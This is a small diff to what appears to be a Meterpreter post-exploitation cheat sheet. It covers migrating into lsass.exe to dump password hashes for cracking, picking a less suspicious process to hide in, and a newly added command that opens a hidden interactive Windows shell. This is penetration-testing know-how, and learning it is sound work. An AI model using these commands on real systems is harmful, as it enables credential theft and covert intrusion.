@@ -197,7 +197,12 @@ ps -U SYSTEM 
 # Change to a process
 migrate  <pid>        
 migrate -N lsass.exe
-# -N   Look for the lsass.exe process and migrate the process into that. We can do this to run the command: hashdump (we’ll get hashes to use them with john the ripper or ophcrack). Also, we can choose a less suspicious process such as svhost.exe and migrate there
+# -N   Look for the lsass.exe process and migrate the process into that. We can do this to run the command: hashdump (we’ll get hashes to use them with john the ripper or ophcrack). Also, we can choose a less suspicious process such as svhost.exe and migrate there.
+
+# Get a windows shell
+execute -f cmd.exe -i -H
+
+
 ```
   
 ## metasploit modules
